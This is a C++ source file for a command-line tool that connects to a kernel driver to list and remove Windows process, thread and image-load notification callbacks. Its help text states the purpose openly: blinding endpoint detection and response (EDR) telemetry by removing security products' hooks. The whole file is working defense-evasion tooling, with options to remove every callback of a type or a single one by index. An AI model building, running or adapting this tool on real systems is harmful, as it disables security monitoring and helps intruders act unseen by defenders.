#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>
#include "../Memory/DriverInterface/driver_interface.hpp"

void print_help( const char* prog )
{
	printf( "%s - Enumerate and remove kernel notification callbacks.\n", prog );
	printf( "\n" );
	printf( "Description:\n" );
	printf( "  Lists or removes registered kernel notification callbacks for\n" );
	printf( "  process creation, thread creation, or image load events. This is\n" );
	printf( "  useful for blinding EDR kernel telemetry by removing their hooks.\n" );
	printf( "\n" );
	printf( "Usage:\n" );
	printf( "  %s <type>                             Enumerate callbacks\n", prog );
	printf( "  %s <type> --remove-all                Remove all callbacks of type\n", prog );
	printf( "  %s <type> --remove-index <index>      Remove single callback by index\n", prog );
	printf( "  %s --help                             Show this help\n", prog );
	printf( "\n" );
	printf( "Arguments:\n" );
	printf( "  type            Callback type: process, thread, or image\n" );
	printf( "  --remove-all    Remove all callbacks of the given type\n" );
	printf( "  --remove-index  Remove a single callback at the given array index\n" );
	printf( "\n" );
	printf( "Examples:\n" );
	printf( "  %s process                     List all process creation callbacks\n", prog );
	printf( "  %s thread --remove-all          Remove all thread callbacks\n", prog );
	printf( "  %s image --remove-index 3       Remove image callback at index 3\n", prog );
}

static ULONG parse_type( const char* s )
{
	if( strcmp( s, "process" ) == 0 ) return CALLBACK_TYPE_PROCESS;
	if( strcmp( s, "thread" )  == 0 ) return CALLBACK_TYPE_THREAD;
	if( strcmp( s, "image" )   == 0 ) return CALLBACK_TYPE_IMAGE;
	return ~0u;
}

static const char* type_name( ULONG t )
{
	switch( t )
	{
	case CALLBACK_TYPE_PROCESS: return "process";
	case CALLBACK_TYPE_THREAD:  return "thread";
	case CALLBACK_TYPE_IMAGE:   return "image";
	default: return "unknown";
	}
}

int main( int argc, char* argv[] )
{
	if( argc < 2 || strcmp( argv[1], "--help" ) == 0 || strcmp( argv[1], "-h" ) == 0 )
	{
		print_help( argv[0] );
		return argc > 1 && ( strcmp( argv[1], "--help" ) == 0 || strcmp( argv[1], "-h" ) == 0 ) ? 0 : 1;
	}

	const auto cb_type = parse_type( argv[1] );

	if( cb_type == ~0u )
	{
		printf( "[!] Unknown callback type '%s'. Use: process, thread, or image.\n", argv[1] );
		return 1;
	}

	const auto driver = std::make_unique< driver_interface >();

	if( !driver->is_connected() )
	{
		printf( "[!] Could not connect to the driver!\n" );
		return 1;
	}

	// Check for --remove-all or --remove-index
	bool remove_all = false;
	bool remove_single = false;
	ULONG remove_index = 0;

	for( int i = 2; i < argc; i++ )
	{
		if( strcmp( argv[i], "--remove-all" ) == 0 )
			remove_all = true;
		else if( strcmp( argv[i], "--remove-index" ) == 0 && i + 1 < argc )
		{
			remove_single = true;
			remove_index = static_cast< ULONG >( strtoul( argv[++i], nullptr, 10 ) );
		}
	}

	if( remove_single )
	{
		if( driver->remove_callback( cb_type, remove_index ) )
			printf( "[+] Removed %s callback at index %u.\n", type_name( cb_type ), remove_index );
		else
		{
			printf( "[!] Failed to remove callback at index %u.\n", remove_index );
			return 1;
		}
	}
	else if( remove_all )
	{
		if( auto removed = driver->remove_all_callbacks( cb_type ) )
			printf( "[+] Removed %u %s callbacks.\n", *removed, type_name( cb_type ) );
		else
		{
			printf( "[!] Failed to remove %s callbacks.\n", type_name( cb_type ) );
			return 1;
		}
	}
	else
	{
		// Enumerate only
		if( auto callbacks = driver->enum_callbacks( cb_type ) )
		{
			printf( "[+] Found %llu %s callbacks:\n",
				static_cast< unsigned long long >( callbacks->size() ), type_name( cb_type ) );

			for( const auto& cb : *callbacks )
				printf( "    [%u] 0x%llX\n", cb.index, static_cast< unsigned long long >( cb.address ) );
		}
		else
		{
			printf( "[!] Failed to enumerate %s callbacks.\n", type_name( cb_type ) );
			return 1;
		}
	}

	return 0;
}
